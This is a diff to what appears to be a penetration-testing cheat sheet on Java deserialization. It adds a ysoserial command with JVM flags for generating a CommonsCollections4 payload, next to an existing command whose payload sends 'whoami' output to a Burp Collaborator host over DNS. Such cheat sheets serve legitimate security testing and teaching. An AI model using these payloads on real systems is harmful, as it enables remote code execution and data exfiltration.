@@ -2680,6 +2680,10 @@ Because of `Runtime.exec()`, ysoserial doesn't work well with multiple commands.
 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 'sh -c $@|sh . echo host $(whoami).<MY-RATOR-ID>.burpcollaborator.net' | gzip | base64
 ```
 
+Other options
+- `java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections4 "id"`
+  - See [this](https://forum.portswigger.net/thread/ysoserial-stopped-working-b5a161f42f)
+
 **Ysoserial.net**
 
 Windows Defender might tag the application as virus.
